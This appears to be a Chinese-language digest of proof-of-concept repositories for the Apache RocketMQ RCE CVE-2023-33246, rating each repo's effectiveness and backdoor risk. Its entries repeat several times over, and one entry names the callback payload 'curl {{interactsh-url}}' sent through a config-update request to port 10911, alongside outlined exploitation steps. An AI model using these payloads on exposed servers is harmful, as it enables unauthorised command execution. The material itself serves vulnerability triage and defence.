总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

